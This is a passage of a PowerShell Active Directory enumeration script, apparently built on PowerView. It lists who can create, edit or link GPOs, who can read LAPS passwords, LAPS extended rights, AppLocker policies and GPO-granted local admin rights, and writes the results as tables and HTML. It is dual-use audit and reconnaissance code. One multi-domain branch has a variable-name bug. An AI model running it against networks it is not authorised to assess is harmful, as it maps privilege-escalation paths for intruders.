				$linkedAccounts = Get-DomainUser -Domain $AllDomain -LDAPFilter "(displayname=*$nameParts*)"
				foreach ($account in $linkedAccounts) {
					[PSCustomObject]@{
						"Account" = $account.samaccountname
						"Display Name" = $account.displayname
						"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($account.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($account.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $account.lastlogontimestamp
						"SID" = $account.objectSID
						"Domain" = $AllDomain
					}
				}
			}
		}
	}

 	if ($LinkedDAAccounts) {
		$LinkedDAAccounts | Sort-Object Domain,Account,"Display Name" | Format-Table -AutoSize -Wrap
		$HTMLLinkedDAAccounts = $LinkedDAAccounts | Sort-Object Domain,Account,"Display Name" | ConvertTo-Html -Fragment -PreContent "<h2>Linked DA accounts using name correlation</h2>"
	}
	
	#######################################
    ########### GPO Rights ################
	#######################################

    if($GPOsRights -OR $AllEnum){
	
	Write-Host ""
		Write-Host "Who can create GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$dcName = "DC=" + $Domain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$GPOCreators = Get-DomainObjectAcl -Domain $Domain -Server $Server -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server }
			$TempGPOCreators = foreach ($GPOCreator in $GPOCreators) {
				[PSCustomObject]@{
					"Account" = $GPOCreator
					"Domain" = $Domain
				}
			}
		}
		
		else {
			$TempGPOCreators = foreach ($AllDomain in $AllDomains) {
				$dcName = "DC=" + $AllDomain.Split(".")
				$dcName = $dcName -replace " ", ",DC="
				$GPOCreators = Get-DomainObjectAcl -Domain $AllDomain -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier -Domain $AllDomain }
				foreach ($GPOCreator in $GPOCreators) {
					[PSCustomObject]@{
						"Account" = $GPOCreator
						"Domain" = $AllDomain
					}
				}
			}
		}

		if ($TempGPOCreators) {
			$TempGPOCreators | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
			$HTMLGPOCreators = $TempGPOCreators | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Who can create GPOs</h2>"
		}


        Write-Host ""
        Write-Host "Who can modify existing GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$jSIDdomain = Get-DomainSID -Domain $Domain -Server $Server

			$jGPOIDRAW = (Get-DomainGPO -Domain $Domain -Server $Server | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })

			$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)

			if ($jGPOIDRAW) {
				$TempGPOsWhocanmodify = foreach ($jGPOID in $jGPOIDs) {
					$jGPOIDSELECTs = ($jGPOIDRAW | ? { $_.ObjectDN -eq $jGPOID } | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
					$TargetsWhoCanEdits = foreach ($jGPOIDSELECT in $jGPOIDSELECTs) {
						$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT")
						$objUser = $SID.Translate([System.Security.Principal.NTAccount])
						$objUser.Value
					}
					
					$TempPolicyInfo = Get-DomainGPO -Domain $Domain -Server $Server -Identity $jGPOID
					
					foreach($TargetsWhoCanEdit in $TargetsWhoCanEdits){

						[PSCustomObject]@{
							"Policy Name" = $TempPolicyInfo.displayName
							"Who can edit" = $TargetsWhoCanEdit
							"Policy Path" = $TempPolicyInfo.gpcFileSysPath
							Domain = $Domain
       							#"OUs the policy applies to" = ((Get-DomainOU -Domain $Domain -Server $Server -GPLink "$jGPOID").name | Sort-Object -Unique) -join " - "
						}
					}
				}

				if ($TempGPOsWhocanmodify) {
					$TempGPOsWhocanmodify | Sort-Object Domain,"Policy Name","Who can edit" | Format-Table -AutoSize -Wrap
					$HTMLGPOsWhocanmodify = $TempGPOsWhocanmodify | Sort-Object Domain,"Policy Name","Who can edit" | ConvertTo-Html -Fragment -PreContent "<h2>Who can modify existing GPOs</h2>"
				}
			}
		}
		
		else {
			$TempGPOsWhocanmodify = foreach ($AllDomain in $AllDomains) {
				$jSIDdomain = Get-DomainSID -Domain $AllDomain

				$jGPOIDRAW = (Get-DomainGPO -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })

				$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)

				if ($jGPOIDRAW) {
					foreach ($jGPOID in $jGPOIDs) {
						$jGPOIDSELECTs = ($jGPOIDRAW | ? { $_.ObjectDN -eq $jGPOID } | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
						$TargetsWhoCanEdits = foreach ($jGPOIDSELECT in $jGPOIDSELECTs) {
							$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT")
							$objUser = $SID.Translate([System.Security.Principal.NTAccount])
							$objUser.Value
						}
						
						$TempPolicyInfo = Get-DomainGPO -Domain $AllDomain -Identity $jGPOID
						
						foreach($TargetsWhoCanEdit in $TargetsWhoCanEdits){

							[PSCustomObject]@{
								"Policy Name" = $TempPolicyInfo.displayName
								"Who can edit" = $TargetsWhoCanEdit
								"Policy Path" = $TempPolicyInfo.gpcFileSysPath
								Domain = $AllDomain
								#"OUs the policy applies to" = ((Get-DomainOU -Domain $AllDomain -GPLink "$jGPOID").name | Sort-Object -Unique) -join " - "
							}
						}
					}
				}
			}

			if ($TempGPOsWhocanmodify) {
				$TempGPOsWhocanmodify | Sort-Object Domain,"Policy Name","Who can edit" | Format-Table -AutoSize -Wrap
				$HTMLGPOsWhocanmodify = $TempGPOsWhocanmodify | Sort-Object Domain,"Policy Name","Who can edit" | ConvertTo-Html -Fragment -PreContent "<h2>Who can modify existing GPOs</h2>"
			}
		}


        Write-Host ""
		Write-Host "Who can link GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$gpolinkresult = (Get-DomainOU -Domain $Domain -Server $Server | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
			$TempGpoLinkResults = foreach ($result in $gpolinkresult) {
				[PSCustomObject]@{
					"Who can link" = (ConvertFrom-SID -Domain $Domain -Server $Server $result.SecurityIdentifier)
					"Security Identifier" = $result.SecurityIdentifier
					Domain = $Domain
					"Object DN" = $result.ObjectDN
					"Active Directory Rights" = $result.ActiveDirectoryRights
					"Object Ace Type" = $result.ObjectAceType
				}
			}

			if ($TempGpoLinkResults) {
				$TempGpoLinkResults | Sort-Object Domain,"Who can link","Object DN" | Format-Table -AutoSize -Wrap
				$HTMLGpoLinkResults = $TempGpoLinkResults | Sort-Object Domain,"Who can link","Object DN" | ConvertTo-Html -Fragment -PreContent "<h2>Who can link GPOs</h2>"
			}
		}
		else {
			$TempGpoLinkResults = foreach ($AllDomain in $AllDomains) {
				$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
				foreach ($result in $gpolinkresult) {
					[PSCustomObject]@{
						"Who can link" = (ConvertFrom-SID -Domain $AllDomain $result.SecurityIdentifier)
						"Security Identifier" = $result.SecurityIdentifier
						Domain = $AllDomain
						"Object DN" = $result.ObjectDN
						"Active Directory Rights" = $result.ActiveDirectoryRights
						"Object Ace Type" = $result.ObjectAceType
					}
				}
			}

			if ($TempGpoLinkResults) {
				$TempGpoLinkResults | Sort-Object Domain,"Who can link","Object DN" | Format-Table -AutoSize -Wrap
				$HTMLGpoLinkResults = $TempGpoLinkResults | Sort-Object Domain,"Who can link","Object DN" | ConvertTo-Html -Fragment -PreContent "<h2>Who can link GPOs</h2>"
			}
		}

    }
	
	#####################################
    ########### LAPS GPOs ###############
	#####################################

	if($NoLAPS){}
	else{
		Write-Host ""
		Write-Host "LAPS GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LAPSGPOs = Get-DomainGPO -Domain $Domain -Server $Server | Where-Object { $_.DisplayName -like "*laps*" }
			$TempLAPSGPOs = foreach ($LAPSGPO in $LAPSGPOs) {
				
				$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
				
				foreach($LAPSGPOLoc in $LAPSGPOLocation){
					$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
					$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
					$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
					$splitString = ($splitString | Out-String) -split "`n"
					$splitString = $splitString.Trim()
					$splitString = $splitString | Where-Object { $_ -ne "" }
					$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
					$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
					if ($adminAccountRow) {
						$LAPSAdminresult = ($adminAccountRow -split ';')[4]
					}
				}
				
				[PSCustomObject]@{
					"GPO Name" = $LAPSGPO.DisplayName
					"Path Name" = $LAPSGPO.Name
					"LAPS Admin" = $LAPSAdminresult
					"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
					Domain = $Domain
				}
				
				$LAPSAdminresult = $null
				$LAPSGPOLocation = $null
				$inputString = $null
				$splitString = $null
			}

			if ($TempLAPSGPOs) {
				$TempLAPSGPOs | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap
				$HTMLLAPSGPOs = $TempLAPSGPOs | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>LAPS GPOs</h2>"
			}
		}
		else {
			$TempLAPSGPOs = foreach ($AllDomain in $AllDomains) {
				$LAPSGPOs = Get-DomainGPO -Domain $AllDomain | Where-Object { $_.DisplayName -like "*laps*" }
				foreach ($LAPSGPO in $LAPSGPOs) {
					
					$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
				
					foreach($LAPSGPOLoc in $LAPSGPOLocation){
						$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
						$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
						$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
						$splitString = ($splitString | Out-String) -split "`n"
						$splitString = $splitString.Trim()
						$splitString = $splitString | Where-Object { $_ -ne "" }
						$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
						$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
						if ($adminAccountRow) {
							$LAPSAdminresult = ($adminAccountRow -split ';')[4]
						}
					}
					
					[PSCustomObject]@{
						"GPO Name" = $LAPSGPO.DisplayName
						"Path Name" = $LAPSGPO.Name
						"LAPS Admin" = $LAPSAdminresult
						"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
						Domain = $AllDomain
					}
					
					$LAPSAdminresult = $null
					$LAPSGPOLocation = $null
					$inputString = $null
					$splitString = $null
				}
			}

			if ($TempLAPSGPOs) {
				$TempLAPSGPOs | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap
				$HTMLLAPSGPOs = $TempLAPSGPOs | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>LAPS GPOs</h2>"
			}
		}
		
		Write-Host ""
		Write-Host "Other GPOs where a LAPS Admin seems to be set:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LAPSAdminGPOs = Get-DomainGPO -Domain $Domain -Server $Server | Where-Object { $_.DisplayName -notlike "*laps*" }
			$TempLAPSAdminGPOs = foreach ($LAPSGPO in $LAPSAdminGPOs) {
				
				$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
				
				foreach($LAPSGPOLoc in $LAPSGPOLocation){
					$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
					$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
					$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
					$splitString = ($splitString | Out-String) -split "`n"
					$splitString = $splitString.Trim()
					$splitString = $splitString | Where-Object { $_ -ne "" }
					$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
					$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
					if ($adminAccountRow) {
						$LAPSAdminresult = ($adminAccountRow -split ';')[4]
					}
				}
				
				[PSCustomObject]@{
					"GPO Name" = $LAPSGPO.DisplayName
					"Path Name" = $LAPSGPO.Name
					"LAPS Admin" = $LAPSAdminresult
					"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
					Domain = $Domain
				}
				
				$LAPSAdminresult = $null
				$LAPSGPOLocation = $null
				$inputString = $null
				$splitString = $null
			}

			if ($TempLAPSAdminGPOs | Where-Object {$_."LAPS Admin"}) {
				$TempLAPSAdminGPOs | Where-Object {$_."LAPS Admin"} | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap
				$HTMLLAPSAdminGPOs = $TempLAPSAdminGPOs | Where-Object {$_."LAPS Admin"} | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>Other GPOs where a LAPS Admin seems to be set</h2>"
			}
		}
		
		else {
			$TempLAPSAdminGPOs = foreach ($AllDomain in $AllDomains) {
				$LAPSAdminGPOs = Get-DomainGPO -Domain $AllDomain | Where-Object { $_.DisplayName -notlike "*laps*" }
				foreach ($LAPSGPO in $LAPSAdminGPOs) {
					
					$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
				
					foreach($LAPSGPOLoc in $LAPSGPOLocation){
						$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
						$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
						$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
						$splitString = ($splitString | Out-String) -split "`n"
						$splitString = $splitString.Trim()
						$splitString = $splitString | Where-Object { $_ -ne "" }
						$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
						$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
						if ($adminAccountRow) {
							$LAPSAdminresult = ($adminAccountRow -split ';')[4]
						}
					}
					
					[PSCustomObject]@{
						"GPO Name" = $LAPSGPO.DisplayName
						"Path Name" = $LAPSGPO.Name
						"LAPS Admin" = $LAPSAdminresult
						"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
						Domain = $AllDomain
					}
					
					$LAPSAdminresult = $null
					$LAPSGPOLocation = $null
					$inputString = $null
					$splitString = $null
				}
			}

			if ($TempLAPSAdminGPOs | Where-Object {$_."LAPS Admin"}) {
				$TempLAPSAdminGPOs | Where-Object {$_."LAPS Admin"} | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap
				$HTMLLAPSAdminGPOs = $TempLAPSAdminGPOs | Where-Object {$_."LAPS Admin"} | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>Other GPOs where a LAPS Admin seems to be set</h2>"
			}
		}

  		if($LAPSReadRights -OR $AllEnum){

			Write-Host ""
			Write-Host "Who can read LAPS:" -ForegroundColor Cyan
			if ($Domain -and $Server) {
				$LAPSCanReads = Get-NetOU -Domain $Domain -Server $Server -Properties distinguishedname | Get-ObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}
				$TempLAPSCanRead = foreach ($LAPSCanRead in $LAPSCanReads) {
					[PSCustomObject]@{
						"Delegated Groups" = (ConvertFrom-SID $LAPSCanRead.SecurityIdentifier -Domain $Domain)
						"Target OU" = $LAPSCanRead.ObjectDN
						Domain = $Domain
					}
				}
	
				if ($TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null}) {
					$TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null} | Sort-Object Domain,"Delegated Groups","Target OU" | Format-Table -AutoSize -Wrap
					$HTMLLAPSCanRead = $TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null} | Sort-Object Domain,"Delegated Groups","Target OU" | ConvertTo-Html -Fragment -PreContent "<h2>Who can read LAPS</h2>"
				}
			}
			else {
				$TempLAPSCanRead = foreach ($AllDomain in $AllDomains) {
					$LAPSCanReads = Get-NetOU -Domain $AllDomain -Properties distinguishedname | Get-ObjectAcl -Domain $AllDomain -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}
					foreach ($LAPSCanRead in $LAPSCanReads) {
						[PSCustomObject]@{
							"Delegated Groups" = (ConvertFrom-SID $LAPSCanRead.SecurityIdentifier -Domain $AllDomain)
							"Target OU" = $LAPSCanRead.ObjectDN
							Domain = $AllDomain
						}
					}
				}
	
				if ($TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null}) {
					$TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null} | Sort-Object Domain,"Delegated Groups","Target OU" | Format-Table -AutoSize -Wrap
					$HTMLLAPSCanRead = $TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null} | Sort-Object Domain,"Delegated Groups","Target OU" | ConvertTo-Html -Fragment -PreContent "<h2>Who can read LAPS</h2>"
				}
			}
  		}

  		if($LAPSExtended -OR $AllEnum){
			Write-Host ""
			Write-Host "LAPS Extended Rights:" -ForegroundColor Cyan
			
			if ($Domain -and $Server) {
				
				$LAPSFilter = "(objectCategory=Computer)(ms-mcs-admpwdexpirationtime=*)"
				
				$ExtendedRights = Get-ObjectAcl -ResolveGUIDs -Filter $LAPSFilter -Domain $Domain -Server $Server | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" }
				
				$CompMap = @{}
				
				$ComputerObjects = Get-NetComputer -Filter "(ms-mcs-admpwdexpirationtime=*)" -Domain $Domain -Server $Server | ForEach-Object { $CompMap.Add($_.distinguishedname, $_.dnshostname) }
				
				$TempLAPSExtended = $ExtendedRights | ForEach-Object {
	
					$LAPSComputerName =  $CompMap[$_.ObjectDN]
					
					$LAPSIdentity = $_.IdentityReference
	
					if($_.ObjectType -match "All" -and $_.IdentityReference -notmatch "BUILTIN") { $Status = "Non Delegated by Admin" }
					
					else { return }
	
					[PSCustomObject]@{
						"Computer Name" = $LAPSComputerName
						"Identity" = $LAPSIdentity
						"Status" = $Status
						"Domain" = $Domain
					}
	
				}
				
				if ($TempLAPSExtended) {
					$TempLAPSExtended | Sort-Object Domain,"Computer Name","Identity" | Format-Table -AutoSize -Wrap
					$HTMLLAPSExtended = $TempLAPSExtended | Sort-Object Domain,"Computer Name","Identity" | ConvertTo-Html -Fragment -PreContent "<h2>LAPS Extended Rights</h2>"
				}
				
			}
			
			else {
				$TempLAPSCanRead = foreach ($AllDomain in $AllDomains) {
					
					$LAPSFilter = "(objectCategory=Computer)(ms-mcs-admpwdexpirationtime=*)"
				
					$ExtendedRights = Get-ObjectAcl -ResolveGUIDs -Filter $LAPSFilter -Domain $AllDomain | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" }
					
					$CompMap = @{}
					
					$ComputerObjects = Get-NetComputer -Filter "(ms-mcs-admpwdexpirationtime=*)" -Domain $AllDomain | ForEach-Object { $CompMap.Add($_.distinguishedname, $_.dnshostname) }
					
					$ExtendedRights | ForEach-Object {
	
						$LAPSComputerName =  $CompMap[$_.ObjectDN]
						
						$LAPSIdentity = $_.IdentityReference
	
						if($_.ObjectType -match "All" -and $_.IdentityReference -notmatch "BUILTIN") { $Status = "Non Delegated by Admin" }
						
						else { return }
	
						[PSCustomObject]@{
							"Computer Name" = $LAPSComputerName
							"Identity" = $LAPSIdentity
							"Status" = $Status
							"Domain" = $Domain
						}
	
					}
					
				}
				
				if ($TempLAPSExtended) {
					$TempLAPSExtended | Sort-Object Domain,"Computer Name","Identity" | Format-Table -AutoSize -Wrap
					$HTMLLAPSExtended = $TempLAPSExtended | Sort-Object Domain,"Computer Name","Identity" | ConvertTo-Html -Fragment -PreContent "<h2>LAPS Extended Rights</h2>"
				}
				
			}
  		}
		
		if($LAPSComputers -OR $AllEnum){

			Write-Host ""
			Write-Host "Computer objects where LAPS is enabled:" -ForegroundColor Cyan
			if ($Domain -and $Server) {
				$LapsEnabledComputers = Get-DomainComputer -Domain $Domain -Server $Server | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null }
				$TempLapsEnabledComputers = foreach ($LapsEnabledComputer in $LapsEnabledComputers) {
					[PSCustomObject]@{
						"Name" = $LapsEnabledComputer.samaccountname
						"IP Address" = Resolve-DnsName -Name $LapsEnabledComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
						"Account SID" = $LapsEnabledComputer.objectsid
						Domain = $Domain
					}
				}

				if ($TempLapsEnabledComputers) {
					$TempLapsEnabledComputers | Sort-Object Domain,"Name" | Format-Table -AutoSize -Wrap
					$HTMLLapsEnabledComputers = $TempLapsEnabledComputers | Sort-Object Domain,"Name" | ConvertTo-Html -Fragment -PreContent "<h2>Computer objects where LAPS is enabled</h2>"
				}
			}
			else {
				$TempLapsEnabledComputers = foreach ($AllDomain in $AllDomains) {
					$LapsEnabledComputers = Get-DomainComputer -Domain $AllDomain | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null }
					foreach ($LapsEnabledComputer in $LapsEnabledComputers) {
						[PSCustomObject]@{
							"Name" = $LapsEnabledComputer.samaccountname
							"IP Address" = Resolve-DnsName -Name $LapsEnabledComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
							"Account SID" = $LapsEnabledComputer.objectsid
							Domain = $AllDomain
						}
					}
				}

				if ($TempLapsEnabledComputers) {
					$TempLapsEnabledComputers | Sort-Object Domain,"Name" | Format-Table -AutoSize -Wrap
					$HTMLLapsEnabledComputers = $TempLapsEnabledComputers | Sort-Object Domain,"Name" | ConvertTo-Html -Fragment -PreContent "<h2>Computer objects where LAPS is enabled</h2>"
				}
			}
		}
		
	}
	
	##########################################
    ########### AppLocker GPOs ###############
	##########################################
    
	if($NoAppLocker){}
	else{
		Write-Host ""
		Write-Host "AppLocker GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AppLockerGPOs = Get-DomainGPO -Domain $Domain -Server $Server | Where-Object { $_.DisplayName -like "*AppLocker*" }
			$TempAppLockerGPOs = foreach ($AppLockerGPO in $AppLockerGPOs) {
				[PSCustomObject]@{
					"Display Name" = $AppLockerGPO.DisplayName
					"GPC File Sys Path" = $AppLockerGPO.GPCFileSysPath
					Domain = $Domain
				}
			}

			if ($TempAppLockerGPOs) {
				$TempAppLockerGPOs | Sort-Object Domain,"Display Name" | Format-Table -AutoSize -Wrap
				$HTMLAppLockerGPOs = $TempAppLockerGPOs | Sort-Object Domain,"Display Name" | ConvertTo-Html -Fragment -PreContent "<h2>AppLocker GPOs</h2>"
			}
		}
		
		else {
			$TempAppLockerGPOs = foreach ($AllDomain in $AllDomains) {
				$AppLockerGPOs = Get-DomainGPO -Domain $AllDomain | Where-Object { $_.DisplayName -like "*AppLocker*" }
				foreach ($AppLockerGPO in $AppLockerGPOs) {
					[PSCustomObject]@{
						"Display Name" = $AppLockerGPO.DisplayName
						"GPC File Sys Path" = $AppLockerGPO.GPCFileSysPath
						Domain = $AllDomain
					}
				}
			}

			if ($TempAppLockerGPOs) {
				$TempAppLockerGPOs | Sort-Object Domain,"Display Name" | Format-Table -AutoSize -Wrap
				$HTMLAppLockerGPOs = $TempAppLockerGPOs | Sort-Object Domain,"Display Name" | ConvertTo-Html -Fragment -PreContent "<h2>AppLocker GPOs</h2>"
			}
		}
	}
	
	####################################################################
    ########### GPOs that modify local group memberships ###############
	####################################################################
	
	if($MoreGPOs -OR $AllEnum){
        Write-Host ""
		Write-Host "GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPOLocalGroups = Get-DomainGPOLocalGroup -Domain $Domain -Server $Server
			$TempGPOLocalGroupsMembership = foreach ($GPOLocalGroup in $GPOLocalGroups) {
				[PSCustomObject]@{
					"GPO Display Name" = $GPOLocalGroup.GPODisplayName
					"Group Name" = $GPOLocalGroup.GroupName
				}
			}

			if ($TempGPOLocalGroupsMembership) {
				$TempGPOLocalGroupsMembership | Sort-Object Domain,"GPO Display Name","Group Name" | Format-Table -AutoSize -Wrap
				$HTMLGPOLocalGroupsMembership = $TempGPOLocalGroupsMembership | Sort-Object Domain,"GPO Display Name","Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>GPOs that modify local group memberships</h2>"
			}
		}
		else {
			$TempGPOLocalGroupsMembership = foreach ($AllDomain in $AllDomains) {
				$GPOLocalGroups = Get-DomainGPOLocalGroup -Domain $AllDomain
				foreach ($GPOLocalGroup in $GPOLocalGroups) {
					[PSCustomObject]@{
						"GPO Display Name" = $GPOLocalGroup.GPODisplayName
						"Group Name" = $GPOLocalGroup.GroupName
					}
				}
			}

			if ($TempGPOLocalGroupsMembership) {
				$TempGPOLocalGroupsMembership | Sort-Object Domain,"GPO Display Name","Group Name" | Format-Table -AutoSize -Wrap
				$HTMLGPOLocalGroupsMembership = $TempGPOLocalGroupsMembership | Sort-Object Domain,"GPO Display Name","Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>GPOs that modify local group memberships</h2>"
			}
		}
    }
	
	###################################################################################
    ########### Users which are in a local group of a machine using GPO ###############
	###################################################################################
	
	if($MoreGPOs -OR $AllEnum){
        Write-Host ""
		Write-Host "Users which are in a local group of a machine using GPO:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPOComputerAdmins = Get-DomainComputer -Domain $Domain -Server $Server | Find-GPOComputerAdmin -Domain $Domain -Server $Server
			$TempGPOComputerAdmins = foreach ($GPOComputerAdmin in $GPOComputerAdmins) {
				[PSCustomObject]@{
					"Computer Name" = $GPOComputerAdmin.ComputerName
					"Object Name" = $GPOComputerAdmin.ObjectName
					"Object SID" = $GPOComputerAdmin.ObjectSID
					"Is Group" = $GPOComputerAdmin.IsGroup
					"GPO Display Name" = $GPOComputerAdmin.GPODisplayName
					"GPO Path" = $GPOComputerAdmin.GPOPath
					Domain = $Domain
				}
			}

			if ($TempGPOComputerAdmins) {
				$TempGPOComputerAdmins | Sort-Object Domain,"Computer Name" | Format-Table -AutoSize -Wrap
				$HTMLGPOComputerAdmins = $TempGPOComputerAdmins | Sort-Object Domain,"Computer Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users which are in a local group of a machine using GPO</h2>"
			}
		}
		else {
			$TempGPOComputerAdmins = foreach ($AllDomain in $AllDomains) {
				$GPOComputerAdmins = Get-DomainComputer -Domain $AllDomain | Find-GPOComputerAdmin -Domain $AllDomain
				foreach ($GPOComputerAdmin in $GPOComputerAdmins) {
					[PSCustomObject]@{
						"Computer Name" = $GPOComputerAdmin.ComputerName
						"Object Name" = $GPOComputerAdmin.ObjectName
						"Object SID" = $GPOComputerAdmin.ObjectSID
						"Is Group" = $GPOComputerAdmin.IsGroup
						"GPO Display Name" = $GPOComputerAdmin.GPODisplayName
						"GPO Path" = $GPOComputerAdmin.GPOPath
						Domain = $AllDomain
					}
				}
			}

			if ($TempGPOComputerAdmins) {
				$TempGPOComputerAdmins | Sort-Object Domain,"Computer Name" | Format-Table -AutoSize -Wrap
				$HTMLGPOComputerAdmins = $TempGPOComputerAdmins | Sort-Object Domain,"Computer Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users which are in a local group of a machine using GPO</h2>"
			}
		}
    }
	
	#####################################################################################################################
    ########### Machines where a specific domain user/group is a member of the Administrators local group ###############
	#####################################################################################################################
	
	if($MoreGPOs -OR $AllEnum){
		Write-Host ""
		Write-Host "Machines where a specific domain user/group is a member of the Administrators local group:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPOMappings = Get-DomainGPOUserLocalGroupMapping -Domain $Domain -Server $Server -LocalGroup Administrators
			$TempGPOMachinesAdminlocalgroup = foreach ($GPOMapping in $GPOMappings) {
				[PSCustomObject]@{
					"Object Name" = $GPOMapping.ObjectName
					"GPO Display Name" = $GPOMapping.GPODisplayName
